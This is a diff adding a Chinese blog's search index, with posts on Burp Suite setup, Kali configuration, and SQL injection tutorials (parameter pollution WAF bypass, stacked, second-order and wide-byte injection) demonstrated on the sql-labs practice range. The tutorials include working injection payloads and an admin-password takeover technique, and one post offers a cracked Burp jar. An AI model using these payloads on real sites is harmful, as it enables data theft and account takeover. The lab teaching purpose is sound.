@@ -1,0 +1,1121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Burp配置以及基础抓包功能</title>
+    <url>/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<br>
+
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/04b618cd7d870c317c75ce2d047e7934.png" alt="截图"></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>1.Target(目标)——显示目标目录结构的的一个功能。<br>2.Proxy（代理）——是一个拦截HTTP/S的代理服务器（抓包），作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>3.Spider（爬虫）——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。<br>4.Scanner（扫描器）[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web应用程序的安全漏洞。<br>5.Intruder（入侵）——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。<br>6.Repeater（中继器）——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。<br>7.Sequencer（会话）——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。<br>8.Decoder（解码器）——是一个进行手动执行或对应用程序数据者智能解码编码的工具。<br>9.Comparer（对比）——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。<br>10.Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。<br>11.Options(设置)——对Burp Suite的一些设置。</p>
+<h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><p><strong>特别注意</strong>:windows使用burp必须要有java环境,如何安装java以及配置环境变量我就不再赘述,大家自行百度,另外温馨提示,不要下载jdk11以上的,我本人是版本11的,只有最新的几个版本的burp可以使用,大部分支持jdk8版本的.<br>关于安装:如果是kali的话是自带的,是已经安装好并激活的,Windows里的burp早期版本需要自己激活的,但是现在的话基本上都不需要.<br>以下我以windows11下火狐浏览器做示范,chrome的也类似;</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/6498f3a50550570e356bab9c2b88825e.png" alt="截图"></p>
+<p>找到这个位置,默认ip是127.0.0.1,这是本机的ip,端口号默认是8080;</p>
+<br>
+
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/3f6dfd345e0937d40e61dfb15d3a1618.png" alt="截图"></p>
+<p>找到网络代理,按设置,</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/31fd280bb239c5e8dfce8d2e905b1595.png" alt="截图"></p>
+<p>保持和我一样的设置;</p>
+<p>接着就需要导入许可证(kali中也需要导入许可证)</p>
+<p>先将这个按钮打开</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/5c74b29d6374845354913724328d940b.png" alt="截图"></p>
+<p>然后输入ip地址和端口号</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/92ddd67a85b8e5df336910af299814e7.png" alt="截图"></p>
+<p>本人由于8080端口配置了tomcat所以将端口号改为了8888,接着按右上角CA,下载许可证,</p>
+<p>保存到桌面即可.</p>
+<p>接着在设置里搜索证书</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/af7af2a2be00d481bcb3491e9232cfc9.png" alt="截图"></p>
+<p>选择导入,将桌面的许可证证书导入进去就大功告成啦.</p>
+<p>当然,如果自己不想设置浏览器代理，也可以通过burpsuite内置的浏览器进行访问，如下图所示，点击两处open browser中的任何一个就会弹出一个内置浏览器。</p>
+<br>
+
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/12272403aafed7bc344f7c21fadff9fb.png" alt="截图"></p>
+<h1 id="Burp最基础操作–抓包"><a href="#Burp最基础操作–抓包" class="headerlink" title="Burp最基础操作–抓包"></a>Burp最基础操作–抓包</h1><ol>
+<li>打开Proxy功能中的Intercept选项卡，确认拦截功能为“Interception is on”状态，如果显示为“Intercept is off”则点击它，打开拦截功能。</li>
+<li>打开浏览器，输入你需要访问的URL(以<a href="http://baike.baidu.com/">http://baike.baidu.com/</a> 为例)并回车，这时你将会看到数据流量经过Burp Proxy并暂停，直到你点击【Forward】，才会继续传输下去。如果点击了【Drop】，则这次通过的数据将会被丢失，不再继续处理。<img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2f291324ae980cbfa04dcbb760bc4d06.png" alt="截图"></li>
+</ol>
+<p>当我们点击【Forward】之后，我们将看到这次请求返回的所有数据，如下图所示</p>
+<p><img src="/2021/11/18/Burp%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/771f10b4f2801d88a305b6dd0e53cc61.png" alt="截图"></p>
+<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>这是最基础的内容了,主要还是面对和我当初一样什么都不懂,不知道怎么配置或者不知道如何抓包的小白.如果大家还有什么问题或者要burp2021的jar包(已破解,可以直接安装使用),可以加我QQ.</p>
+]]></content>
+      <categories>
+        <category>工具介绍</category>
+      </categories>
+      <tags>
+        <tag>工具介绍</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021Kali设置中文输入法</title>
+    <url>/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/</url>
+    <content><![CDATA[<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/11402e41071b529aacb4dc3ab472e6fa.png" alt="截图"></p>
+<p>我的版本是最新的2021.11.5号的版本</p>
+<p>由于版本原因,很多大佬的教程只能提供参考价值而不能直接让我按部就班,安装了一个下午,甚至重装过一次,最后终于弄好了,我将自己的成功经历分享给大家.</p>
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p> 终端内输入</p>
+<pre class=" language-sudo"><code class="language-sudo"> sudo vim /etc/apt/sources.list
+</code></pre>
+<p>  然后输入密码,进入可编辑页面.</p>
+<p>将里面的东西全都注释或者删除,加入以下代码</p>
+<p>如果是非root权限的,先按i进入编辑模式,编辑完之后先按esc,再按:,输入wq后回车</p>
+<pre class=" language-deb"><code class="language-deb">#中科大
+deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+#阿里云
+deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+</code></pre>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/6913c7f4dd0d69a8f83ea452cf816ece.png" alt="截图"></p>
+<pre><code>#接着输入这行代码,表示更新的一些操作并重启
+sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt-get autoremove -y &amp;&amp; reboot
+</code></pre>
+<p>如果不喜欢最新版本的话谨慎操作这步,可自行百度并减少几个步骤(主要是我爱瞎折腾,所以什么都喜欢最新的版本).到这里更新源的操作就结束了,正式开始更改输入法.</p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><pre><code># 使用更新后的apt-get安装ibus中文输入法
+apt-get install ibus-pinyin
+ 
+# 安装好后，需要重启
+sudo reboot
+</code></pre>
+<p>接着找到输入法设置,选择使用ibus</p>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/815c56bc335567bb79e7bb5d027fe75e.png" alt="截图"></p>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/ac2e8f132728d66f482d253518fc4865.png" alt="截图"></p>
+<p>接着去设置里设置输入法</p>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/7fc062fa4fbff101500955c6622b6134.png" alt="截图"></p>
+<p>在这个地方,非常隐蔽…当初找了很久没找到</p>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/e5eee78073e887b1bc349b7b73fb3c0b.png" alt="截图"></p>
+<p>按那个➕号之后选择第二个中文(Pinyin)</p>
+<p>到这步就算成功了.</p>
+<p>另外kali切换输入法的默认快捷键是win+空格,想要切换也很简单</p>
+<p><img src="/2021/11/18/Kail%E8%AE%BE%E7%BD%AE%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/1d19ddcf01787756330e7529e0ea04fd.png" alt="截图"></p>
+<p>点一下右上角的ibus的i,在快捷键这里设置一下就好.</p>
+<p>完结撒花😀</p>
+]]></content>
+      <categories>
+        <category>工具介绍</category>
+      </categories>
+      <tags>
+        <tag>工具介绍</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(HPP参数污染)</title>
+    <url>/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/</url>
+    <content><![CDATA[<h1 id="SQL注入-HPP参数污染"><a href="#SQL注入-HPP参数污染" class="headerlink" title="SQL注入(HPP参数污染)"></a>SQL注入(HPP参数污染)</h1><h2 id="参数污染原理"><a href="#参数污染原理" class="headerlink" title="参数污染原理"></a>参数污染原理</h2><p>HPP方法主要是用于两层架构的服务器,什么是两层架构的服务器呢?我从网上找到了图片方便大家理解:</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/20162bc1ad71f3499facd3bcf0586e4d.png" alt="13183513-df29b4e99837e09a.png"></p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache服务器请求数据。数据返回路径则相反。</p>
+<p>另外,关于不同的服务器,获取的参数位置也是不同的</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/6546840e7cba1dd9bd8c739bfc8c016d.png" alt="13183513-aeff71531eb18d77.png"></p>
+<p>什么意思呢?给大家举个简单的例子:</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/1cf033d7b9d9ce2485075d3ceee335b3.png" alt="ACHIeJ.png"></p>
+<p>在必应浏览器中,我们能发现浏览器返回的参数只有后面一位,第一位就消失了,可以知道该浏览器的服务器是PHP/Apache.</p>
+<p>而在谷歌中,</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/7d3b6bfd5e7e15e6bfdd50110acd570a.png" alt="ACbPYt.png"></p>
+<p>返回的是全部参数,所以用的是后面两个服务器.</p>
+<h2 id="如何绕过WAF"><a href="#如何绕过WAF" class="headerlink" title="如何绕过WAF"></a>如何绕过WAF</h2><p>我们知道这两个特性之后,再了解一下他们双层架构中不同服务器的分工:</p>
+<p>tomcat主要是做拦截用的,做数据处理和过滤,相当于WAF</p>
+<p>apache是负责给浏览器提供服务的,返回的最终值也是apache提供的.</p>
+<p>这时候漏洞便出来了,我们构造id = 1 &amp; id = 2(假设id=1属于正常的数据,id=2属于危险数据),因为tomcat只能过滤第一个参数,他就会漏掉第二个参数,而恰好的,apache获取的参数是最后一个,刚好不是被过滤的那个,那么id=1作为一个正常数据被放过了,这样的话id=1和id=2这个整体都被放过,apache并不知道有这回事,它只能傻傻地取id=2这个危险值并返回.至此,我们就绕过了waf.</p>
+<h2 id="参数污染实验"><a href="#参数污染实验" class="headerlink" title="参数污染实验"></a>参数污染实验</h2><p>我们使用sql-labs29关作为实验</p>
+<p>现在有些靶场的源码已经改过了,在index.php中没有了拦截,为了使用出参数污染,我们需要先进入login.php目录中(不过PTB群里的师傅太好了,在我提出这个问题后马上就解决了,我们现在在index.php中也能被拦截了)</p>
+<p>首先判断闭合</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/4d692e55475ce25b94d03432ebc6a7fa.png" alt="截图"></p>
+<p>我们不管是先输入id=1’还是id=1”都是会被返回到另一个页面去的</p>
+<p>这时候我们就使用&amp;来绕过waf.</p>
+<p><img src="/2022/01/19/SQL%E6%B3%A8%E5%85%A5(HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93)/7c9c1ca41b8686ebf4fcf01627c3533f.png" alt="截图"></p>
+<p>当我们输入?id=1&amp;id=1’的时候报错了,说明存在单引号闭合,再添加注释符以及括号就知道本关是单纯的单引号闭合,接下来的注入内容就很简单了,和第一关的联合注入一样;</p>
+<p>给出两个关键步骤:</p>
+<p>爆表名:</p>
+<p><code>?id=1&amp;id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></p>
+<p>爆记录:</p>
+<p><code>?id=1&amp;id=-1&#39; union select 1,2,(select group_concat(flag) from xxxxxx) --+</code> </p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(堆叠注入)</title>
+    <url>/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="SQL注入-堆叠注入"><a href="#SQL注入-堆叠注入" class="headerlink" title="SQL注入(堆叠注入)"></a>SQL注入(堆叠注入)</h1><h2 id="堆叠注入定义"><a href="#堆叠注入定义" class="headerlink" title="堆叠注入定义"></a>堆叠注入定义</h2><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
+<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<p><strong>所以说,堆叠注入不同于其他注入一样只能查询,它可以添加修改信息,可以对数据库进行破坏.</strong></p>
+<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>我们以sql-labs 39作为例子</p>
+<p>我们先用联合注入的形式得到数据库的名字字段名和表名,然后就可以用堆叠注入的手法将其插入数据:</p>
+<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120150934119.png" alt="image-20220120150934119"></p>
+<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120151029955.png" alt="image-20220120151029955"></p>
+<p>这时候我们再输入id=66,发现我们插入语句就成功了,说明我们就可以利用堆叠注入随心所欲地对数据库进行修改了.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(二次注入)</title>
+    <url>/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="SQL注入-二次注入"><a href="#SQL注入-二次注入" class="headerlink" title="SQL注入(二次注入)"></a>SQL注入(二次注入)</h1><h2 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h2><blockquote>
+<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+</blockquote>
+<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ul>
+<li>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
+<li>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
+</ul>
+<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>当源码中出现mysql_real_escape_string() 函数时</p>
+<p><img src="/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/a7aaca07333269a120bc1da354d873a3.png" alt="截图"></p>
+<p>这时候我们是无法注入的,因为它会将我们的注入语句防御.</p>
+<p>所以我们要寻找没有这个函数的地方进行注入.</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>以sql-labs 24关为例子</p>
+<p>首先做到这里,单纯靠盲注几乎是做不出来的,我们要结合代码审计才行.</p>
+<p>先看登录界面</p>
+<pre><code>function sqllogin()&#123;
+
+      $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
+
+      $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
+
+      $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
+
+      //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
+
+      $res = mysql_query($sql) or die(&#39;You tried to be real smart, Try harder!!!! :( &#39;);
+
+      $row = mysql_fetch_row($res);
+
+      //print_r($row) ;
+
+      if ($row[1]) 
+
+      &#123;
+
+            return $row[1];
+
+      &#125; 
+
+      else 
+
+      &#123;
+
+              return 0;
+
+      &#125;
+
+&#125;
+</code></pre>
+<p>被mysql_real_escape_string()限制的死死的,所以这里没有注入点</p>
+<p>再看看注册页面</p>
+<pre><code>if (isset($_POST[&#39;submit&#39;]))
+&#123;
+      # Validating the user input........
+      //$username = $_POST[&#39;username&#39;] ;
+      $username = mysql_escape_string($_POST[&#39;username&#39;]) ;
+      $pass = mysql_escape_string($_POST[&#39;password&#39;]);
+      $re_pass = mysql_escape_string($_POST[&#39;re_password&#39;]);
+    
+      echo &quot;&lt;font size=&#39;3&#39; color=&#39;#FFFF00&#39;&gt;&quot;;
+      $sql = &quot;select count(*) from users where username=&#39;$username&#39;&quot;;
+      $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
+      $row = mysql_fetch_row($res);
+    
+      //print_r($row);
+      if (!$row[0] == 0) 
+      &#123;
+            ?&gt;
+        &lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;;
+        &lt;?php
+            header(&#39;refresh:1, url=new_user.php&#39;);
+      &#125; 
+      else 
+      &#123;
+            if ($pass == $re_pass)
+            &#123;
+                  # Building up the query........    
+                  $sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
+                  mysql_query($sql) or die(&#39;Error Creating your user account,  : &#39;.mysql_error());
+          echo &quot;&lt;/br&gt;&quot;;
+          echo &quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#39;3&#39; color=&#39;#FFFF00&#39;&gt;&quot;;                   
+          //echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;
+          echo &quot;&lt;/br&gt;&quot;;
+          echo &quot;&lt;/br&gt;&quot;;
+          echo &quot;&lt;/br&gt;&quot;;                    
+          echo &quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;;
+          echo &quot;&lt;font size=&#39;2&#39;&gt;&quot;;
+          echo &quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;;
+          header(&#39;refresh:5, url=index.php&#39;);
+            &#125;
+        else
+        &#123;
+                  ?&gt;
+          &lt;script&gt;alert(&#39;Please make sure that password field and retype password match correctly&#39;)&lt;/script&gt;
+          &lt;?php
+          header(&#39;refresh:1, url=new_user.php&#39;);
+            &#125;
+      &#125;
+&#125;
+</code></pre>
+<p>也是没有注入点</p>
+<p>再看登录进去的密码修改页面</p>
+<pre><code>if (isset($_POST[&#39;submit&#39;]))
+&#123;
+      # Validating the user input........
+      $username = $_SESSION[&quot;username&quot;];
+      $curr_pass = mysql_real_escape_string($_POST[&#39;current_password&#39;]);
+      $pass = mysql_real_escape_string($_POST[&#39;password&#39;]);
+      $re_pass = mysql_real_escape_string($_POST[&#39;re_password&#39;]);
+    
+      if($pass == $re_pass)
+      &#123;    
+            $sql = &quot;UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;
+            $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
+            $row = mysql_affected_rows();
+            echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
+            echo &#39;&lt;center&gt;&#39;;
+            if($row == 1)
+            &#123;
+                  echo &quot;Password successfully updated&quot;;
+            &#125;
+            else
+            &#123;
+                  header(&#39;Location: failed.php&#39;);
+                  //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;
+            &#125;
+      &#125;
+      else
+      &#123;
+            echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;
+            echo &quot;Make sure New Password and Retype Password fields have same value&quot;;
+            header(&#39;refresh:2, url=index.php&#39;);
+      &#125;
+&#125;
+</code></pre>
+<p>现在就出现了破绽, <code> $username = $_SESSION[&quot;username&quot;];</code>并没有进行转义</p>
+<p>接着结合我们的sql语句</p>
+<p><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;$username&#39; and password=&#39;$curr_pass&#39; </code></p>
+<p>可以在username处添加注释符,后面的password就失效了,对password的过滤自然也是消失了.</p>
+<p><img src="/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/6e3db13994e953bf49cd7f82b8873121.png" alt="截图"></p>
+<p>首先我们新建一个用户名为admin’#,密码为123;</p>
+<p>下面我考大家一个问题,我们在新建的时候单引号会被转义为字符形式的单引号,那么进入数据库中的单引号是转义前的还是转义后的呢?答案是转义前的,是可以闭合语句的单引号.这就是这关的重点:<strong>mysql_real_escape_string() 函数仅仅只在验证的时候进行转义,当数据存到数据库后又会变为原数据!</strong></p>
+<p>知道这点之后我们继续</p>
+<p><img src="/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/c1788730ea9590c1400c7b7338d921ef.png" alt="截图"></p>
+<p>现在我们登录进来,有权限改密码了,而这个更新密码的地方就是我们的注入点.</p>
+<pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;$username&#39; and password=&#39;$curr_pass&#39; 
+</code></pre>
+<p>因为这个admin’#是我们自己创建的,所以账号密码都是知道的,而admin是系统自带的,我们并不知道密码,所以我们要使用自己构造的账号去修改admin的密码.</p>
+<p>当我们修改密码时的sql语句为:</p>
+<pre><code>显然,UPDATE users SET PASSWORD =&#39;新密码&#39; where username =&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; 
+</code></pre>
+<p>显然,#后面的给我们注释掉了,于是我们的sql语句变为了</p>
+<pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;admin&#39;#
+</code></pre>
+<p>现在,我们修改的是admin账户的密码,而不是admin#’用户的密码了.</p>
+<p><img src="/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/485e7c675c6bb79bd87160f9dbabf5db.png" alt="截图"></p>
+<p>利用admin和新改的密码即可登录进来.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(宽字节注入)</title>
+    <url>/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="SQL注入-宽字节注入"><a href="#SQL注入-宽字节注入" class="headerlink" title="SQL注入(宽字节注入)"></a>SQL注入(宽字节注入)</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p><strong>1.宽字节</strong></p>
+<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
+<p><strong>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符(前一个ASCII码需要大于128才能到达汉字的范围)是一个汉字</strong></p>
+<p><strong>2.addslashes()函数</strong></p>
+<p>1、addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>2、预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p>
+<p>3、实例</p>
+<pre><code>
+&lt;?php
+$ss=addslashes(&#39;aiyou&quot;bu&quot;cuoo&#39;);
+echo($ss);
+?&gt;
+运行结果：
+aiyou\&quot;bu\&quot;cuoo
+</code></pre>
+<p>我们知道,当我们想过滤单引号(‘)的时候,不能直接过滤’而是需要先将其转义,然后再过滤&#39;符号</p>
+<p>我们知道单引号转换为编码是%27,反斜杠的编码是%5c,当单引号被转义的时候就会变成%5c%27,因为前一个字符%5c没有超过128,所以%5c%28被认为是两个字符,就会被过滤检测到,但是当我们在%5c前面加一个超过128的ascii码,这个字符和%5c就能合体为一个新的汉字,从而使得&#39;无法匹配到’从而绕过检测.</p>
+<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>id=1’</p>
+<p>经过addslashes() 函数转义后变为:</p>
+<p>id=1&#39;</p>
+<p>此时我们的&#39;被黑名单&#39;给匹配到,所以就无法注入了.但是我们在\前面加个大于128的ASCII码,比如%df,就变成:</p>
+<p>id=1%df&#39;</p>
+<p>而mysql检测到%df\是一个双字节的字符,于是就变成:</p>
+<p>id =1運’</p>
+<p>因为我们检测的是&#39;而不是’所以我们就算成功绕过检测了</p>
+<p>又因为php是弱类型的语言,所以’1’=’1運’,这时候我们就可以正常地开始注入了.</p>
+<h2 id="特别声明"><a href="#特别声明" class="headerlink" title="!特别声明"></a>!特别声明</h2><p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5)/e3e22f4dfdbfee8231b9d175d9d2a1a4.png" alt="截图"></p>
+<p>sql注入和XSS不是一样的,虽然宽字符和XSS都用到编码,但是宽字符注入的字符集并不是你在网页上F12就可以看出来的,他判断的是mysql使用的字符集,而不是网页使用的字符集.我在网上看到一些师傅混淆了他们的概念,特此声明.比如sql-labs less32我们网页显示用的是utf-8,但是我们依然可以用宽字节进行注入,说明后端还是用的GBK等宽字节字符集的.</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>以sql-labs less32为例</p>
+<p>爆表:<code> ?id=0%df&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)--+</code></p>
